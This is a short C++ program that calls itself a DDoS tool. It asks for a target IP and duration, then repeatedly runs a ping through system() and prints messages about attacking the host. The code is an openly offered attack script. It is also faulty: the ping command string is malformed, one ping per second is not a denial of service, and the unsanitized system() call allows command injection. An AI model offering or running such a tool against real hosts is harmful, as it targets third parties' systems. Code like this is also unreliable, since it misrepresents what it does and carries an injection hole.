
#include <iostream>
#include <string>
#include <chrono>
#include <thread>
#include <cstdlib>

int main(){
    std::string ip;
    int timeout;

    std::cout << "Enter IP address to DDOS:";
    std::cin >> ip;

    std::cout << "Enter timeout in seconds:";
    std::cin >> timeout;

    std::cout << "Starting DDOS attack on " << ip << " for " << timeout << " seconds." << std::endl;

    int i = 0;
    auto start = std::chrono::high_resolution_clock::now();

    while(true){
        auto end = std::chrono::high_resolution_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(end - start);
        if (elapsed.count() >= timeout){
            break;
        }
        else {
            std::cout << "Sending packet " << i << " to " << ip << std::endl;
            system(("ping -c 1" + ip).c_str());
            i++;
            std::this_thread::sleep_for(std::chrono::milliseconds(1000));
        }
    }

    std::cout << "Finished DDOS Attack" << std::endl;

    return 0;
}
